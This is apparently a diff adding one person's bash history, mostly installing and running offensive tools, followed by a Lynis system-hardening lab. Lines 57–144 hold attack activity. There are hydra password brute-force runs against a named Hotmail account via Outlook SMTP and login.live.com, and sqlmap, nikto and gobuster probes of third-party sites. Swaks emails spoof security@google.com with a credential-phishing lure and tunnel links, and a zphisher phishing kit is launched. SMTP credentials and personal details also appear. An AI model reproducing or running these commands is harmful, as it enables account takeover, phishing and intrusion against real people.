@@ -1,0 +1,198 @@
+    1  sudo apt update
+    2  sudo apt update -y
+    3  sudo apt upgrade -y
+    4  sudo apt install nmap -y
+    5  sudo apt install wireshark -y
+    6  sudo apt install netcat -y
+    7  sudo apt install [200~netcat-traditional 1.10-48
+    8  sudo apt install netcat-traditional 1.10-48
+    9  -y
+   10  sudo apt install netcat-traditional 1.10-48
+   11  sudo apt update
+   12  sudo apt install netcat-traditional -y
+   13  nc -h
+   14  sudo add-apt-repository universe
+   15  sudo apt install masscan -y
+   16  masscan --version
+   17  sudo apt install nikto -y
+   18  nikto -Version
+   19  sudo apt install sqlmap -y
+   20  sqlmap --version
+   21  sudo apt remove --purge sqlmap -y
+   22  sudo apt autoremove -y
+   23  sudo apt clean
+   24  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
+   25  sudo apt install git
+   26  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
+   27  cd ~/sqlmap
+   28  python3 sqlmap.py --version
+   29  echo 'export PATH="$HOME/sqlmap:$PATH"' >> ~/.bashrc
+   30  source ~/.bashrc
+   31  sqlmap --version
+   32  ls ~
+   33  ls /
+   34  cd ~
+   35  sudo ln -s ~/sqlmap/sqlmap.py /usr/local/bin/sqlmap
+   36  sqlmap --version
+   37  cd /sqlmap
+   38  ls -l ~ | grep sqlmap
+   39  rm -rf ~/sqlmap
+   40  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
+   41  sudo apt install python3 python3-pip -y
+   42  python3 --version
+   43  sudo rm /usr/local/bin/sqlmap
+   44  sudo ln -s ~/sqlmap/sqlmap.py /usr/local/bin/sqlmap
+   45  sqlmap --version
+   46  sudo ln -s /usr/bin/python3 /usr/bin/python
+   47  python --version
+   48  ls -l ~/sqlmap/sqlmap.py
+   49  sudo rm /usr/local/bin/sqlmap
+   50  sudo ln -s ~/sqlmap/sqlmap.py /usr/local/bin/sqlmap
+   51  sqlmap --version
+   52  nikto -Version
+   53  sudo apt install john -y
+   54  sudo apt install hydra -y
+   55  sudo apt install aircrack-ng -y
+   56  sudo apt install metasploit-framework -y
+   57  curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate.sh | sudo bash
+   58  sudo apt install curl
+   59  curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate.sh | sudo bash
+   60  sudo apt update && sudo apt install curl gnupg2 -y
+   61  curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sudo bash
+   62  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall
+   63  hydra -h
+   64  [200~hydra -l victim_email@example.com -P password_list.txt smtp-mail.outlook.com smtp -V
+   65  hydra -l victim_emailmbarkenijo@hotmail.com -P password_list.txt smtp-mail.outlook.com smtp -V
+   66  ls /usr/share/wordlists/
+   67  gunzip -c /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
+   68  touch /usr/share/wordlists/
+   69  ls
+   70  hydra -l mbarkenijo@hotmail.com -P rockyou.txt login.live.com http-post-form "/common/oauth2/authorize:loginfmt=^USER^&passwd=^PASS^:F=Sign in failed"
+   71  git clone https://github.com/danielmiessler/SecLists.git
+   72  hydra -l mbarkenijo@hotmail.com -P password_list.txt smtp-mail.outlook.com smtp -V
+   73  ls
+   74  cd SecLists
+   75  ls
+   76  cd Passwords
+   77  ls
+   78  hydra -l mbarkenijo@hotmail.com -P ~/SecLists/Passwords/darkweb2017-top10000.txt login.live.com http-post-form "/common/oauth2/authorize:loginfmt=^USER^&passwd=^PASS^:F=Sign in failed"
+   79  nslookup -type=mx igdinhcao.com
+   80  dig mx igdinhcao.com
+   81  curl -I http://igdinhcao.com
+   82  whatweb igdinhcao.com
+   83  sudo apt install whatweb
+   84  whatweb igdinhcao.com
+   85  subfinder -d igdinhcao.com
+   86  amass enum -d igdinhcao.com
+   87  curl -I http://emailfake.com
+   88  whatweb emailfake.com
+   89  holehe igdinhcao.com
+   90  nikto -h https://emailfake.com
+   91  nikto -h https://emailfake.com -Tuning 9 -C all
+   92  gobuster dir -u https://emailfake.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+   93  sudo apt install gobuster
+   94  gobuster dir -u https://emailfake.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+   95  curl -s https://emailfake.com/robots.txt
+   96  searchsploit php 7.2.34
+   97  msfconsole
+   98  sqlmap -u "https://emailfake.com/login.php" --forms --dbs --batch
+   99  sqlmap -u "https://emailfake.com/login.php" --tables -D emailfake_db
+  100  nmap -sC -sV -p- 91.196.52.205
+  101  holehe emailfake.com
+  102  pip3 install holehe
+  103  sudo apt install python3-pip -y
+  104  pip3 install holehe
+  105  sudo apt install python3-pip -y
+  106  pip3 install holehe
+  107  holehe --help
+  108  sudo apt install pipx -y
+  109  pipx ensurepath
+  110  exec bash
+  111  pipx install holehe
+  112  holehe emailfake.com
+  113  holehe mmnpvqpgeo@igdinhcao.com
+  114  dehashed.com (Paid)
+  115  haveibeenpwned.com (Free)
+  116  holehe --only google.com,instagram.com mmnpvqpgeo@igdinhcao.com
+  117  holehe mmnpvqpgeo@igdinhcao.com --only google.com instagram.com
+  118  pip install pwned
+  119  pipz install pwned
+  120  sudo apt install pwned
+  121  pipx install pwned
+  122  pwned mmnpvqpgeo@igdinhcao.com
+  123  holehe --only-used mmnpvqpgeo@igdinhcao.com
+  124  holehe mmnpvqpgeo@igdinhcao.com | grep -E 'google.com|instagram.com'
+  125  sudo apt install sendemail -y
+  126  sudo apt install libio-socket-ssl-perl libnet-ssleay-perl -y
+  127  sudo apt install swaks -y
+  128  swaks --to mmnpvqpgeo@igdinhcao.com --from security@google.com --header "Subject: URGENT: Suspicious Login Attempt Detected" --body "A login attempt was detected from an unrecognized device. Secure your account now: [FAKE LINK]" --server smtp.mailtrap.io --auth LOGIN --auth-user your_smtp_user --auth-password your_smtp_pass
+  129  swaks --to fyouhacker9876@hotmail.com --from security@google.com --header "Subject: URGENT: Suspicious Login Attempt Detected" --body "Dear User,\n\nWe detected an unusual login attempt on your Google account. If this was you, ignore this email. If not, secure your account immediately by verifying your credentials:\n\n[FAKE LINK HERE]\n\nGoogle Security Team." --server sandbox.smtp.mailtrap.io --port 587 --auth LOGIN --auth-user 8b4a7ef41692c9 --auth-password 0342d70137d0f0 --tls
+  130  git clone https://github.com/htr-tech/zphisher.git
+  131  cd zphisher
+  132  bash zphisher.sh
+  133  zphisher
+  134  git clone https://github.com/htr-tech/zphisher.git
+  135  cd zphisher
+  136  bash zphisher.sh
+  137  swaks --to fyouhacker9876@hotmail.com --from security@google.com --header "Subject: URGENT: Suspicious Login Attempt Detected" --body "A login attempt was detected from an unrecognized device. Secure your account now: https://trademark-aging-medicaid-gazette.trycloudflare.com" --server smtp.mailtrap.io --port 587 --auth LOGIN --auth-user 1234567890abcdef --auth-password 0987654321fedcba
+  138  swaks --to fyouhacker9876@hotmail.com --from security@google.com --header "Subject: URGENT: Suspicious Login Attempt Detected" --body "Dear User,\n\nWe detected an unusual login attempt on your Google account. If this was you, ignore this email. If not, secure your account immediately by verifying your credentials:\n\n[https://vegas-fix-fact-dv.trycloudflare.com]\n\nGoogle Security Team." --server sandbox.smtp.mailtrap.io --port 587 --auth LOGIN --auth-user 8b4a7ef41692c9 --auth-password 0342d70137d0f0 --tls
+  139  git clone https://github.com/htr-tech/zphisher.git
+  140  cd zphisher
+  141  bash zphisher.sh
+  142  zphisher
+  143  sudo zphisher
+  144  bash zphisher.sh
+  145  sudo apt update && sudo apt upgrade
+  146  sudo apt install lynis
+  147  sudo lynis audit system
+  148  sudo lynis audit system | tee lynis_scan_before.txt
+  149  mv lynis_scan_before.txt ~/vulnerability-management-lab/
+  150  ls
+  151  ls ~
+  152  mv lynis_scan_before.txt /vulnerability-management-lab/
+  153  mkdir vulnerability-management-lab
+  154  mv lynis_scan_before.txt ~/vulnerability-management-lab/
+  155  cd /vulnerability-management-lab
+  156  ls
+  157  cd vulnerability-management-lab
+  158  git init
+  159  git branch -m main
+  160  git add lynis-scan_before.txt
+  161  ls
+  162  git add lynis-scan-before.txt
+  163  git add lynis-scan_before.txt
+  164  git add lynis_scan_before.txt
+  165  git commit -m "Initial Lynis scan results before remediation"
+  166  git config --global user.email "rjblack0@live.com
+git config --global user.name "Ryan Blackburn"
+
+
+git remote add origin https://github.com/rjblack0/security-hardening
+
+git push -u origin main
+  167  git config --global user.email "rjblack0@live.com"
+  168  git config --global user.name "Ryan Blackburn"
+  169  git remove add origin https://github.com/rjblack0/security-hardening
+  170  git remote add origin https://github.com/rjblack0/security-hardening
+  171  git push -u origin main
+  172  gh repo clone rjblack0/security-hardening
+  173  sudo apt  install gh  # version 2.45.0-1ubuntu0.1
+  174  gh repo clone rjblack0/security-hardening
+  175  gh auth login
+  176  git remote set-url origin git@github.com:rjblack0/security-hardening.git
+  177  git push -u origin main
+  178  lynis show details CRYP-7902
+  179  ps aux | grep crypto
+  180  lsmod | grep crypto
+  181  openssl speed aes-256-cbc
+  182  sudo update-crypto-policies --show
+  183  sudo update-crypto-policies --set DEFAULT
+  184  openssl version -a
+  185  sudo update-alternatives --display gnutls-priorities
+  186  cat /etc/ssl/openssl.cnf | grep -i cipher
+  187  sudo lynis audit system --debug
+  188  history > terminal_history.txt
+  189  sudo update-alternatives --display gnutls-priorities
+  190  cat /etc/ssl/openssl.cnf | grep -i cipher
+  191  sudo lynis audit system --debug | tee lynis_debug.log
+  192  history > terminal_history_2.txt
